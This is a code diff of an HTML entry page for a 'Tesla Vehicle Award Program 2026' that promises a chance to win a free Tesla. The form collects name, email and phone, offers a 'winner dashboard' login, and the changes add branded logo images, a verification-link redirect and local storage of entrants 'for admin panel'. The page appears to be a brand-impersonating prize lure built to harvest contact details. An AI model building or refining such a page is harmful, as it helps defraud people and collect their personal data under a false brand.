@@ -4,11 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Enter to Win | Tesla Vehicle Award Program 2026</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="css/style.css">
   <style>
     body{background:var(--light);}
-    .entry-wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
+    .entry-wrap{min-height:100svh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
     .entry-card{background:white;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.1);border:1.5px solid rgba(0,0,0,.05);padding:52px 48px;width:100%;max-width:500px;animation:fadeInUp .65s ease forwards;}
     @media(max-width:560px){.entry-card{padding:32px 22px;border-radius:18px;}}
     .entry-logo{text-align:center;margin-bottom:32px;}
@@ -21,7 +23,7 @@
     .privacy-note{font-size:12px;color:var(--gray-2);text-align:center;margin-top:18px;line-height:1.6;}
     .trust-badges{display:flex;align-items:center;justify-content:center;gap:20px;margin-top:28px;flex-wrap:wrap;}
     .trust-badge{display:flex;align-items:center;gap:5px;font-size:12px;color:var(--gray-2);font-weight:500;}
-    .already-entered{background:rgba(227,25,55,.06);border:1px solid rgba(227,25,55,.2);border-radius:var(--radius);padding:14px 18px;font-size:14px;color:var(--red);text-align:center;display:none;margin-bottom:16px;}
+    .already-entered{background:rgba(227,25,55,.06);border:1px solid rgba(227,25,55,.2);border-radius:12px;padding:14px 18px;font-size:14px;color:var(--red);text-align:center;display:none;margin-bottom:16px;}
     .login-panel{display:none;margin-top:18px;padding:20px;border-radius:18px;background:linear-gradient(135deg,#171A20,#2a0a12);color:white;}
     .login-panel.show{display:block;animation:fadeInUp .35s ease forwards;}
     .login-panel .form-label{color:white;}
@@ -32,45 +34,33 @@
     .entry-actions .btn{flex:1;}
     @media(max-width:560px){.entry-actions{flex-direction:column;}.entry-actions .btn{width:100%;}}
     .field-error{font-size:12px;color:var(--red);margin-top:5px;display:none;}
-
-    /* Loading sequence overlay */
-    #entryLoader{
-      position:fixed;inset:0;background:rgba(23,26,32,.97);
-      z-index:9999;display:none;
-      flex-direction:column;align-items:center;justify-content:center;gap:0;
-      backdrop-filter:blur(10px);
-    }
-    #entryLoader.show{display:flex;}
-    .loader-content{text-align:center;}
-    .loader-step{color:white;font-size:18px;font-weight:600;margin-bottom:12px;transition:all .4s ease;}
-    .loader-sub{color:rgba(255,255,255,.5);font-size:14px;margin-bottom:32px;}
-    .loader-bar-wrap{width:240px;height:4px;background:rgba(255,255,255,.1);border-radius:999px;overflow:hidden;margin:0 auto 28px;}
-    .loader-bar{height:100%;background:var(--red);border-radius:999px;width:0%;transition:width .8s ease;}
-    .loader-icon{font-size:64px;margin-bottom:20px;display:none;}
-    .loader-icon.show{display:block;animation:scaleIn .5s cubic-bezier(.34,1.56,.64,1);}
+    .submit-spinner{display:none;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:white;border-radius:50%;animation:spin .6s linear infinite;margin-right:4px;}
+    #submitBtn.loading .submit-spinner{display:inline-block;}
+    #submitBtn.loading .btn-text{opacity:.7;}
   </style>
+  <link rel="icon" type="image/png" href="assets/tesla-award-logo.png">
 </head>
 <body>
 
 <nav class="nav">
   <div class="nav-inner">
-    <a href="/" class="nav-logo">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+    <a href="index.html" class="nav-logo">
+      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle;">
       TESLA
     </a>
-    <a href="/" class="btn btn-ghost" style="font-size:14px;">← Back to Home</a>
+    <a href="index.html" class="btn btn-ghost" style="font-size:14px;">← Back to Home</a>
   </div>
 </nav>
 
 <div class="entry-wrap">
   <div class="entry-card">
     <div class="entry-logo">
-      <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      <img src="assets/tesla-award-logo.png" alt="Tesla Award Program" class="brand-logo-img" style="height:72px;width:auto;margin:0 auto;display:block;">
       <div class="logo-text">TESLA AWARD PROGRAM</div>
     </div>
 
     <h1 class="entry-title">Claim Your Free Entry</h1>
-    <p class="entry-sub">You're one step away from potentially winning a brand-new Tesla. Enter your details below — it takes under 30 seconds and is completely free to enter.</p>
+    <p class="entry-sub">You're one step away from potentially winning a brand-new Tesla. Enter your details below — it takes under 30 seconds and is completely free.</p>
 
     <div class="already-entered" id="alreadyMsg">
       This email has already been entered. Only one entry per person is permitted.
@@ -79,32 +69,33 @@
     <form id="entryForm" novalidate>
       <div class="form-group">
         <label class="form-label" for="firstName">First Name</label>
-        <input class="form-input" type="text" id="firstName" name="firstName" placeholder="e.g. James" autocomplete="given-name">
+        <input class="form-input" type="text" id="firstName" name="firstName" placeholder="e.g. James" autocomplete="given-name" maxlength="50">
       </div>
       <div class="form-group">
         <label class="form-label" for="lastName">Last Name</label>
-        <input class="form-input" type="text" id="lastName" name="lastName" placeholder="e.g. Anderson" autocomplete="family-name">
+        <input class="form-input" type="text" id="lastName" name="lastName" placeholder="e.g. Anderson" autocomplete="family-name" maxlength="50">
       </div>
       <div class="form-group">
         <label class="form-label" for="email">Email Address <span style="color:var(--red)">*</span></label>
-        <input class="form-input" type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email" required>
+        <input class="form-input" type="email" id="email" name="email" placeholder="you@example.com" autocomplete="email" required maxlength="254">
         <div class="field-error" id="emailError">Please enter a valid email address.</div>
       </div>
       <div class="form-group">
         <label class="form-label" for="phone">Phone Number <span style="color:var(--red)">*</span></label>
         <div class="phone-input-wrap">
           <span class="phone-prefix">📱</span>
-          <input class="form-input" type="tel" id="phone" name="phone" placeholder="+1 (555) 000-0000" autocomplete="tel" required>
+          <input class="form-input" type="tel" id="phone" name="phone" placeholder="+1 (555) 000-0000" autocomplete="tel" required maxlength="30">
         </div>
         <div class="field-error" id="phoneError">Please enter a valid phone number.</div>
       </div>
 
       <button type="submit" class="btn btn-primary btn-full btn-lg" id="submitBtn" style="margin-top:8px;">
-        ⚡ Submit My Free Entry
+        <span class="submit-spinner"></span>
+        <span class="btn-text">⚡ Submit My Free Entry</span>
       </button>
 
       <p class="privacy-note">
-        By entering, you confirm you are 18+ years of age and agree to our <a href="#" style="color:var(--red)">Terms & Conditions</a>. We will never sell your data or send spam.
+        By entering, you confirm you are 18+ and agree to our <a href="#" style="color:var(--red)">Terms &amp; Conditions</a>. We will never sell your data or send spam.
       </p>
     </form>
 
@@ -117,11 +108,11 @@
       <p class="login-copy">Enter the same email and phone number used for your entry. If your email is not verified yet, we will resend your secure verification link.</p>
       <div class="form-group">
         <label class="form-label" for="loginEmail">Email Address</label>
-        <input class="form-input" type="email" id="loginEmail" autocomplete="email" placeholder="you@example.com" required>
+        <input class="form-input" type="email" id="loginEmail" autocomplete="email" placeholder="you@example.com" required maxlength="254">
       </div>
       <div class="form-group">
         <label class="form-label" for="loginPhone">Phone Number</label>
-        <input class="form-input" type="tel" id="loginPhone" autocomplete="tel" placeholder="+1 (555) 000-0000" required>
+        <input class="form-input" type="tel" id="loginPhone" autocomplete="tel" placeholder="+1 (555) 000-0000" required maxlength="30">
       </div>
       <button type="submit" class="btn btn-white btn-full">Login to Dashboard →</button>
     </form>
@@ -134,115 +125,140 @@
   </div>
 </div>
 
-<!-- Loading overlay -->
-<div id="entryLoader">
-  <div class="loader-content">
-    <div class="loader-icon" id="loaderIcon">✅</div>
-    <div class="loader-step" id="loaderStep">Submitting your entry...</div>
-    <div class="loader-sub" id="loaderSub">Please wait while we process your information</div>
-    <div class="loader-bar-wrap">
-      <div class="loader-bar" id="loaderBar"></div>
-    </div>
-    <div id="loaderSpinner" style="display:flex;justify-content:center;"><div class="spinner"></div></div>
-  </div>
-</div>
-
-<script src="/js/config.js"></script>
-<script src="/js/app.js"></script>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
 <script>
-const form = document.getElementById('entryForm');
-const submitBtn = document.getElementById('submitBtn');
-const showLoginBtn = document.getElementById('showLoginBtn');
-const loginForm = document.getElementById('loginForm');
+(function() {
+  var form = document.getElementById('entryForm');
+  var submitBtn = document.getElementById('submitBtn');
+  var showLoginBtn = document.getElementById('showLoginBtn');
+  var loginForm = document.getElementById('loginForm');
+  var isSubmitting = false;
 
-showLoginBtn.addEventListener('click', () => {
-  loginForm.classList.toggle('show');
-  if (loginForm.classList.contains('show')) document.getElementById('loginEmail').focus();
-});
-
-loginForm.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const email = document.getElementById('loginEmail').value.trim();
-  const phone = document.getElementById('loginPhone').value.trim();
-  if (!isValidEmail(email) || !isValidPhone(phone)) { showToast('Enter the email and phone number used for registration.', 'error'); return; }
-  showLoading('Opening your winner dashboard...');
-  try {
-    const data = await apiCall('/login', 'POST', { email, phone });
-    saveSession(data.sessionToken);
-    window.location.href = `/dashboard.html?session=${encodeURIComponent(data.sessionToken)}`;
-  } catch (err) {
-    hideLoading();
-    showToast(err.message || 'Login failed. Please try again.', 'error');
-  }
-});
-
-form.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  document.getElementById('alreadyMsg').style.display = 'none';
-
-  const email = document.getElementById('email').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const firstName = document.getElementById('firstName').value.trim();
-  const lastName = document.getElementById('lastName').value.trim();
-
-  let valid = true;
-  document.querySelectorAll('.field-error').forEach(el => el.style.display = 'none');
-  document.querySelectorAll('.form-input').forEach(el => el.classList.remove('error'));
-
-  if (!isValidEmail(email)) {
-    document.getElementById('emailError').style.display = 'block';
-    document.getElementById('email').classList.add('error');
-    valid = false;
-  }
-  if (!isValidPhone(phone)) {
-    document.getElementById('phoneError').style.display = 'block';
-    document.getElementById('phone').classList.add('error');
-    valid = false;
-  }
-  if (!valid) return;
-
-  // Show loader
-  const loader = document.getElementById('entryLoader');
-  loader.classList.add('show');
-  submitBtn.disabled = true;
-
-  const bar = document.getElementById('loaderBar');
-  const step = document.getElementById('loaderStep');
-  const sub = document.getElementById('loaderSub');
-
-  // Animate progress
-  setTimeout(() => { bar.style.width = '35%'; step.textContent = 'Validating your information...'; }, 300);
-  setTimeout(() => { bar.style.width = '65%'; step.textContent = 'Securing your entry...'; sub.textContent = 'Checking for duplicate entries'; }, 1200);
-
-  try {
-    const data = await apiCall('/entry', 'POST', { email, phone, firstName, lastName });
-
-    setTimeout(() => { bar.style.width = '90%'; step.textContent = 'Sending verification email...'; sub.textContent = 'Almost done!'; }, 2200);
-    setTimeout(() => {
-      bar.style.width = '100%';
-      document.getElementById('loaderSpinner').style.display = 'none';
-      document.getElementById('loaderIcon').classList.add('show');
-      step.textContent = 'Entry Confirmed!';
-      sub.textContent = 'Redirecting you now...';
-    }, 3400);
-
-    setTimeout(() => {
-      window.location.href = `/congratulations.html?email=${encodeURIComponent(email)}&name=${encodeURIComponent(firstName || 'there')}`;
-    }, 4200);
-
-  } catch (err) {
-    loader.classList.remove('show');
-    submitBtn.disabled = false;
-    if (err.message && err.message.toLowerCase().includes('already')) {
-      document.getElementById('alreadyMsg').innerHTML = 'This email has already been entered. <button type="button" id="inlineLoginBtn" style="border:0;background:none;color:var(--red);font-weight:800;text-decoration:underline;cursor:pointer;">Login with email and phone</button>.';
-      document.getElementById('alreadyMsg').style.display = 'block';
-      document.getElementById('alreadyMsg').scrollIntoView({ behavior: 'smooth', block: 'center' });
-      document.getElementById('inlineLoginBtn').addEventListener('click', () => { loginForm.classList.add('show'); document.getElementById('loginEmail').value = email; document.getElementById('loginPhone').value = phone; loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' }); });
-    } else {
-      showToast(err.message || 'Something went wrong. Please try again.', 'error');
+  // ── Login Panel Toggle ──────────────────────────────
+  showLoginBtn.addEventListener('click', function() {
+    loginForm.classList.toggle('show');
+    if (loginForm.classList.contains('show')) {
+      document.getElementById('loginEmail').focus();
+      loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
-  }
-});
+  });
+
+  // ── Login Handler ───────────────────────────────────
+  loginForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    var email = document.getElementById('loginEmail').value.trim();
+    var phone = document.getElementById('loginPhone').value.trim();
+    
+    if (!isValidEmail(email)) { 
+      showToast('Please enter a valid email address.', 'error'); 
+      return; 
+    }
+    if (!isValidPhone(phone)) { 
+      showToast('Please enter a valid phone number.', 'error'); 
+      return; 
+    }
+    
+    showLoading('Opening your winner dashboard...');
+    try {
+      var data = await apiCall('/login', 'POST', { email: email, phone: phone });
+      saveSession(data.sessionToken);
+      window.location.href = 'dashboard.html?session=' + encodeURIComponent(data.sessionToken);
+    } catch (err) {
+      hideLoading();
+      showToast(err.message || 'Login failed. Please try again.', 'error');
+    }
+  });
+
+  // ── Entry Form Handler ──────────────────────────────
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    if (isSubmitting) return;
+    
+    document.getElementById('alreadyMsg').style.display = 'none';
+
+    var email = document.getElementById('email').value.trim();
+    var phone = document.getElementById('phone').value.trim();
+    var firstName = document.getElementById('firstName').value.trim();
+    var lastName = document.getElementById('lastName').value.trim();
+
+    // Clear previous errors
+    var errorEls = document.querySelectorAll('.field-error');
+    for (var i = 0; i < errorEls.length; i++) errorEls[i].style.display = 'none';
+    var inputs = document.querySelectorAll('.form-input');
+    for (var j = 0; j < inputs.length; j++) inputs[j].classList.remove('error');
+
+    var valid = true;
+
+    if (!isValidEmail(email)) {
+      document.getElementById('emailError').style.display = 'block';
+      document.getElementById('email').classList.add('error');
+      valid = false;
+    }
+    if (!isValidPhone(phone)) {
+      document.getElementById('phoneError').style.display = 'block';
+      document.getElementById('phone').classList.add('error');
+      valid = false;
+    }
+    if (!valid) return;
+
+    // Show premium loading overlay
+    isSubmitting = true;
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    showLoading('Submitting your entry...');
+
+    try {
+      var data = await apiCall('/entry', 'POST', { 
+        email: email, 
+        phone: phone, 
+        firstName: firstName, 
+        lastName: lastName 
+      });
+
+      // Store user locally for admin panel
+      window.__teslaStoreUser({ email: email, phone: phone, firstName: firstName, lastName: lastName, verified: false });
+
+      // Success — complete loading animation then redirect
+      hideLoading();
+      setTimeout(function() {
+        var verifyLink = data.verifyLink || '';
+        window.location.href = 'congratulations.html?email=' + encodeURIComponent(email) + '&name=' + encodeURIComponent(firstName || 'there') + '&verify=' + encodeURIComponent(verifyLink);
+      }, 800);
+
+    } catch (err) {
+      hideLoading();
+      isSubmitting = false;
+      submitBtn.disabled = false;
+      submitBtn.classList.remove('loading');
+      
+      var errMsg = err.message || 'Something went wrong. Please try again.';
+      
+      if (errMsg.toLowerCase().indexOf('already') !== -1) {
+        document.getElementById('alreadyMsg').innerHTML = 'This email has already been entered. <button type="button" id="inlineLoginBtn" style="border:0;background:none;color:var(--red);font-weight:800;text-decoration:underline;cursor:pointer;font-size:inherit;">Login with email and phone</button>.';
+        document.getElementById('alreadyMsg').style.display = 'block';
+        document.getElementById('alreadyMsg').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        
+        document.getElementById('inlineLoginBtn').addEventListener('click', function() { 
+          loginForm.classList.add('show'); 
+          document.getElementById('loginEmail').value = email; 
+          document.getElementById('loginPhone').value = phone; 
+          loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' }); 
+        });
+      } else {
+        showToast(errMsg, 'error');
+      }
+    }
+  });
+
+  // ── Clean up on page unload ─────────────────────────
+  window.addEventListener('beforeunload', function() {
+    if (isSubmitting) {
+      hideLoading();
+    }
+  });
+})();
 </script>
 </body>
 </html>
